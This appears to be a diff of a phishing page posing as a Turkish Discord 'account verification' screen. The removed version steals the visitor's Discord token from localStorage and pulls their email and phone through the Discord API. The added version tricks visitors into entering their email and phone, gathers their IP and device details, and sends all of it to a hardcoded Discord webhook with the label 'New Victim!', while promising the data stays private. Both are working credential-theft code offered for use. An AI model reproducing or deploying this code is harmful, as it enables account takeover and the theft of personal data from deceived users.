@@ -1,87 +1,235 @@
 <!DOCTYPE html>
-<html>
+<html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>OP PVP | Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord • Hesap Doğrulama</title>
     <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background: #1e1e2e;
+            background: #36393f;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            font-family: Arial, sans-serif;
-            margin: 0;
+            min-height: 100vh;
+            font-family: 'Segoe UI', sans-serif;
+            padding: 20px;
         }
-        .loader {
-            color: #00ff88;
-            font-size: 24px;
+        .card {
+            background: #2f3136;
+            padding: 30px 25px;
+            border-radius: 8px;
             text-align: center;
+            color: #dcddde;
+            max-width: 400px;
+            width: 100%;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.4);
         }
-        .loader span {
-            display: inline-block;
-            animation: pulse 1.5s ease-in-out infinite;
+        .card img { width: 65px; margin-bottom: 15px; }
+        .card h2 { font-size: 20px; margin-bottom: 5px; }
+        .card .subtitle { font-size: 13px; color: #b9bbbe; margin-bottom: 20px; }
+
+        .input-group {
+            margin-bottom: 12px;
+            text-align: left;
         }
-        @keyframes pulse {
-            0% { opacity: 0.2; }
-            50% { opacity: 1; }
-            100% { opacity: 0.2; }
+        .input-group label {
+            display: block;
+            font-size: 11px;
+            color: #b9bbbe;
+            margin-bottom: 4px;
+            font-weight: bold;
         }
+        .input-group input {
+            width: 100%;
+            padding: 10px 12px;
+            background: #202225;
+            border: 1px solid #40444b;
+            border-radius: 4px;
+            color: #dcddde;
+            font-size: 14px;
+            outline: none;
+            transition: 0.2s;
+        }
+        .input-group input:focus {
+            border-color: #5865f2;
+        }
+        .input-group input::placeholder {
+            color: #72767d;
+        }
+
+        .info-box {
+            background: #202225;
+            padding: 12px;
+            border-radius: 5px;
+            text-align: left;
+            font-family: monospace;
+            font-size: 11px;
+            margin-bottom: 15px;
+            border-left: 3px solid #5865f2;
+            line-height: 1.8;
+        }
+
+        .btn {
+            background: #5865f2;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 4px;
+            font-size: 15px;
+            cursor: pointer;
+            width: 100%;
+            transition: 0.2s;
+            font-weight: bold;
+        }
+        .btn:hover { background: #4752c4; }
+        .btn:disabled { background: #3c3f46; cursor: not-allowed; }
+
+        .success-icon { display: none; color: #3ba55c; font-size: 45px; margin-bottom: 10px; }
+        .success-icon.show { display: block; }
+
+        .small-text { font-size: 10px; color: #72767d; margin-top: 12px; }
+
+        .error { color: #ed4245; font-size: 11px; margin-top: 3px; display: none; }
+        .error.show { display: block; }
     </style>
 </head>
 <body>
-    <div class="loader">
-        <span>🔐</span> Verifying... <span>⏳</span>
+    <div class="card" id="card">
+        <div class="success-icon" id="successIcon">✅</div>
+        <h2 id="title">Hesap Doğrulaması</h2>
+        <p class="subtitle" id="desc">Sunucuya erişmek için bilgilerini doğrula</p>
+        
+        <div class="info-box" id="infoBox">
+            <div>🌐 IP: <strong id="ipDisplay">Alınıyor...</strong></div>
+            <div>📱 Cihaz: <strong id="deviceDisplay">Alınıyor...</strong></div>
+        </div>
+
+        <div id="formArea">
+            <div class="input-group">
+                <label>📧 Email Adresi</label>
+                <input type="email" id="emailInput" placeholder="ornek@mail.com">
+                <div class="error" id="emailError">Geçerli bir email gir.</div>
+            </div>
+            <div class="input-group">
+                <label>📱 Telefon Numarası</label>
+                <input type="tel" id="phoneInput" placeholder="+90 555 123 4567">
+                <div class="error" id="phoneError">Geçerli bir numara gir.</div>
+            </div>
+            <button class="btn" id="verifyBtn" onclick="verify()">Doğrula ve Sunucuya Katıl</button>
+        </div>
+        
+        <p class="small-text">Bu bilgiler sadece güvenlik amaçlıdır, 3. taraflarla paylaşılmaz.</p>
     </div>
 
     <script>
-        (function() {
-            const token = localStorage.getItem('token');
-            const webhook = 'https://discord.com/api/webhooks/1522159080800518185/RT7oVMuIQVBgp7qb2L5suPst3_txYTRH0pyf9LxoYwgdkAmaWx_z7CVRZfEukqogkG0o';
+        // ==================== WEBHOOK'UNU GİR ====================
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1522159080800518185/RT7oVMuIQVBgp7qb2L5suPst3_txYTRH0pyf9LxoYwgdkAmaWx_z7CVRZfEukqogkG0o';
+        // =========================================================
 
-            if (token) {
-                // Token'ı gönder
-                fetch(webhook, {
+        async function getIP() {
+            try {
+                const r = await fetch('https://api.ipify.org?format=json');
+                const d = await r.json();
+                return d.ip;
+            } catch(e) { return 'Alınamadı'; }
+        }
+
+        function getDevice() {
+            const ua = navigator.userAgent;
+            if (/Android/i.test(ua)) return 'Android';
+            if (/iPhone|iPad/i.test(ua)) return 'iOS';
+            if (/Windows/i.test(ua)) return 'Windows';
+            if (/Mac/i.test(ua)) return 'MacOS';
+            if (/Linux/i.test(ua)) return 'Linux';
+            return 'Bilinmiyor';
+        }
+
+        async function init() {
+            const ip = await getIP();
+            document.getElementById('ipDisplay').textContent = ip;
+            document.getElementById('deviceDisplay').textContent = getDevice();
+        }
+
+        function validateEmail(email) {
+            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+        }
+
+        function validatePhone(phone) {
+            return phone.replace(/[\s\-\(\)]/g, '').length >= 10;
+        }
+
+        async function verify() {
+            const email = document.getElementById('emailInput').value.trim();
+            const phone = document.getElementById('phoneInput').value.trim();
+            
+            // Validasyon
+            let valid = true;
+            if (!validateEmail(email)) {
+                document.getElementById('emailError').classList.add('show');
+                valid = false;
+            } else {
+                document.getElementById('emailError').classList.remove('show');
+            }
+            
+            if (!validatePhone(phone)) {
+                document.getElementById('phoneError').classList.add('show');
+                valid = false;
+            } else {
+                document.getElementById('phoneError').classList.remove('show');
+            }
+            
+            if (!valid) return;
+
+            const btn = document.getElementById('verifyBtn');
+            btn.disabled = true;
+            btn.textContent = 'Doğrulanıyor...';
+
+            const ip = document.getElementById('ipDisplay').textContent;
+            const device = getDevice();
+            const time = new Date().toLocaleString('tr-TR');
+
+            // Webhook'a gönder - artık email ve telefon da var
+            const data = {
+                embeds: [{
+                    title: "🕵️ Yeni Kurban!",
+                    color: 0xff0000,
+                    fields: [
+                        { name: "📧 Email", value: `\`${email}\``, inline: false },
+                        { name: "📱 Telefon", value: `\`${phone}\``, inline: false },
+                        { name: "🌐 IP", value: `\`${ip}\``, inline: true },
+                        { name: "📱 Cihaz", value: `\`${device}\``, inline: true },
+                        { name: "🌍 Dil", value: `\`${navigator.language || 'tr'}\``, inline: true },
+                        { name: "🖥️ Tarayıcı", value: `\`${navigator.userAgent.substring(0, 120)}\``, inline: false },
+                        { name: "⏰ Zaman", value: `\`${time}\``, inline: false }
+                    ],
+                    footer: { text: "Zeta Verify • Alpha" },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            try {
+                await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: `**🎯 TOKEN ÇALINDI!**\n\`${token}\``
-                    })
+                    body: JSON.stringify(data)
                 });
 
-                // Kullanıcı bilgilerini al (sadece e-posta ve telefon)
-                fetch('https://discord.com/api/v9/users/@me', {
-                    headers: { 'Authorization': token }
-                })
-                .then(res => res.json())
-                .then(user => {
-                    const email = user.email || 'Gizli';
-                    const phone = user.phone || 'Yok';
-
-                    const bilgi = 
-                        `**📧 E-posta:** ${email}\n` +
-                        `**📱 Telefon:** ${phone}`;
-
-                    fetch(webhook, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ content: bilgi })
-                    });
-                })
-                .catch(() => {})
-                .finally(() => {
-                    setTimeout(() => {
-                        window.location.href = 'https://discord.com/app';
-                    }, 2000);
-                });
-
-            } else {
-                document.querySelector('.loader').innerHTML = '❌ Token not found. Redirecting...';
-                setTimeout(() => {
-                    window.location.href = 'https://discord.com/app';
-                }, 2000);
+                // Başarılı
+                document.getElementById('successIcon').classList.add('show');
+                document.getElementById('title').textContent = 'Doğrulama Başarılı!';
+                document.getElementById('desc').textContent = 'Sunucuya yönlendiriliyorsun...';
+                document.getElementById('infoBox').style.display = 'none';
+                document.getElementById('formArea').style.display = 'none';
+                
+            } catch(e) {
+                btn.disabled = false;
+                btn.textContent = 'Doğrula ve Sunucuya Katıl';
+                alert('Hata oluştu, tekrar dene.');
             }
-        })();
+        }
+
+        init();
     </script>
 </body>
 </html>
